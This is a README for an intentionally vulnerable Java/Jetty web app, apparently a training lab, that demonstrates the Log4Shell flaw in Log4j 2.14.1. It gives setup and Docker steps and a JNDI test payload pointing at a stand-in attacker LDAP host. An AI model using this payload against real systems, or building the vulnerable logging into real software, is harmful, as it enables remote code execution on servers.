# CVE-2021-44228 Log4Shell WebApp Demo

This is a minimal Java web application vulnerable to **Log4Shell (CVE-2021-44228)**, built with:

- Java + Jetty (embedded)
- Log4j 2.14.1 (vulnerable)
- Simple HTML form
- Docker or manual Java support

---

## Quick Start

### Prerequisites:
- Debian/Ubuntu-based system
- Internet access

### Run the setup script:
```bash
chmod +x setup.sh
./setup.sh
```

Open your browser and visit:
👉 [http://localhost:8080](http://localhost:8080)

---

## Docker Alternative

If you prefer Docker:

```bash
docker build -t log4shell-webform .
docker run -p 8080:8080 log4shell-webform
```

---

## Test Payload (work in progress)

Submit the following payload to the form:
```text
${jndi:ldap://attacker.com/a}
```
This will be **logged by Log4j**, potentially triggering the Log4Shell exploit **if you have a rogue LDAP server running**.

---

## Project Structure
```
CyberSec25/
├── Main.java
├── log4j2.xml
├── Dockerfile
├── setup.sh
├── README.md
└── libs/ (downloaded automatically)
```

---

## Disclaimer
This project is intentionally vulnerable. Use responsibly in **isolated test environments** only. The author takes no responsibility for misuse.
